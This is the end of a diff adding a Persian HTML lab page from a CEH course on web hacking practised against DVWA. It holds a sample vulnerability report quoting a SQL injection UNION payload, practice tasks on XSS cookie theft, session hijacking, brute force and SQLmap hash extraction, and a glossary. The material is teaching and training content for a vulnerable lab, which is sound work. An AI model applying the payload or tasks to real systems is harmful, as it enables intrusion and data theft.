+                <li>شواهد (اسکرین‌شات‌ها، کدها، خروجی‌ها)</li>
+                <li>توصیه‌های رفع</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h4>۴. نتیجه‌گیری و توصیه‌ها</h4>
+            <ul>
+                <li>جمع‌بندی کلی</li>
+                <li>اولویت‌بندی رفع آسیب‌پذیری‌ها</li>
+                <li>گام‌های بعدی</li>
+            </ul>
+        </div>
+
+        <div class="step-card">
+            <h4>📌 نمونه گزارش (فرمت هر آسیب‌پذیری)</h4>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir="ltr"><code dir='ltr'>## آسیب‌پذیری: SQL Injection
+
+**سطح خطر:** Critical (CVSS: 9.8)
+**مسیر:** /dvwa/vulnerabilities/sqli/?id=1
+**توضیح:** برنامه وب ورودی کاربر را بدون فیلتر کردن در کوئری SQL قرار می‌دهد.
+
+**شواهد:**
+1' UNION SELECT NULL, database()-- -
+خروجی: dvwa
+
+**تأثیر:** دسترسی کامل به پایگاه داده، سرقت اطلاعات حساس
+
+**توصیه:** استفاده از Prepared Statements و فیلتر کردن ورودی‌ها</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۸: تمرین‌های عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="practice">
+        <h2>🧪 تمرین‌های عملی</h2>
+        <p>
+            این تمرینات به شما کمک می‌کنند تا مهارت‌های خود را تقویت کنید:
+        </p>
+
+        <ul>
+            <li><b>تمرین ۱:</b> سطح امنیت DVWA را به Medium تغییر دهید و حملات SQL Injection و XSS را دوباره اجرا کنید.</li>
+            <li><b>تمرین ۲:</b> با استفاده از Burp Suite Intruder، یک حمله Brute-Force به صفحه ورود DVWA انجام دهید.</li>
+            <li><b>تمرین ۳:</b> با OWASP WebGoat کار کنید و سناریوهای مختلف را تمرین کنید.</li>
+            <li><b>تمرین ۴:</b> یک اسکن کامل از وب‌سایت DVWA با Nikto و Gobuster انجام دهید.</li>
+            <li><b>تمرین ۵:</b> با استفاده از XSS، یک کوکی را بدزدید و با استفاده از آن جلسه کاربر را ربوده کنید.</li>
+            <li><b>تمرین ۶:</b> در OWASP WebGoat، سناریوی IDOR و SSRF را کامل کنید.</li>
+            <li><b>تمرین ۷:</b> یک گزارش حرفه‌ای از تمام آسیب‌پذیری‌های پیدا شده در DVWA تهیه کنید.</li>
+            <li><b>تمرین ۸:</b> با استفاده از SQLmap، داده‌های جدول users را استخراج کرده و هش‌ها را با Hashcat کرک کنید.</li>
+        </ul>
+
+        <div class="highlight-box">
+            <b>📌 گام بعدی:</b>
+            <p>
+                پس از اتمام این آزمایشگاه، به سراغ
+                <a href="../Session_3_Wireless_Hacking/index.html" style="color:#2a7de1;font-weight:bold;">آزمایشگاه هک شبکه‌های بی‌سیم</a> بروید.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۹: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card" id="glossary">
+        <h2>📖 واژه‌نامه تخصصی</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th style="min-width:130px;">واژه</th><th>توضیح</th></tr>
+                <tr>
+                    <td><span class="glossary-term">SQL Injection</span></td>
+                    <td>تزریق کد SQL مخرب به ورودی‌های برنامه برای دسترسی به پایگاه داده.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">XSS</span></td>
+                    <td>Cross-Site Scripting – تزریق کد جاوااسکریپت به صفحات وب.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">CSRF</span></td>
+                    <td>Cross-Site Request Forgery – ارسال درخواست ناخواسته از طرف کاربر.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">IDOR</span></td>
+                    <td>Insecure Direct Object Reference – دسترسی غیرمجاز به اشیاء.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">SSRF</span></td>
+                    <td>Server-Side Request Forgery – درخواست‌های جعلی از سمت سرور.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">XXE</span></td>
+                    <td>XML External Entity Injection – تزریق موجودیت‌های خارجی به XML.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Command Injection</span></td>
+                    <td>اجرای دستورات سیستم از طریق ورودی‌های برنامه.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">WAF</span></td>
+                    <td>Web Application Firewall – فایروال برنامه‌های وب.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">OWASP</span></td>
+                    <td>Open Web Application Security Project – پروژه امنیت برنامه‌های وب.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Payload</span></td>
+                    <td>کد یا داده‌ای که برای بهره‌برداری از آسیب‌پذیری تزریق می‌شود.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">Burp Suite</span></td>
+                    <td>ابزار تست نفوذ برنامه‌های وب.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">SQLmap</span></td>
+                    <td>ابزار خودکار SQL Injection.</td>
+                </tr>
+                <tr>
+                    <td><span class="glossary-term">DVWA</span></td>
+                    <td>Damn Vulnerable Web Application – برنامه وب آسیب‌پذیر برای تمرین.</td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- ===== جمع‌بندی نهایی ===== -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی آزمایشگاه Web Hacking:</b>
+        <p>
+            در این آزمایشگاه جامع، شما با مهم‌ترین آسیب‌پذیری‌های برنامه‌های وب آشنا شدید و آنها را به‌صورت عملی روی DVWA پیاده‌سازی کردید:
+        </p>
+        <ul>
+            <li><b>SQL Injection</b> (۴ نوع مختلف)</li>
+            <li><b>XSS</b> (Reflected, Stored, DOM-based)</li>
+            <li><b>CSRF</b> و Session Fixation</li>
+            <li><b>File Upload</b> و Web Shell</li>
+            <li><b>Command Injection</b></li>
+            <li><b>IDOR</b></li>
+            <li><b>SSRF</b></li>
+            <li><b>XXE</b></li>
+            <li><b>Burp Suite</b> و ابزارهای تکمیلی</li>
+            <li><b>گزارش‌نویسی</b> حرفه‌ای</li>
+        </ul>
+        <p>
+            <b>📌 گام بعدی:</b> این مهارت‌ها را در محیط‌های واقعی مانند <b>HackTheBox</b> و <b>TryHackMe</b> تمرین کنید.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">آزمایشگاه: Web Hacking | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
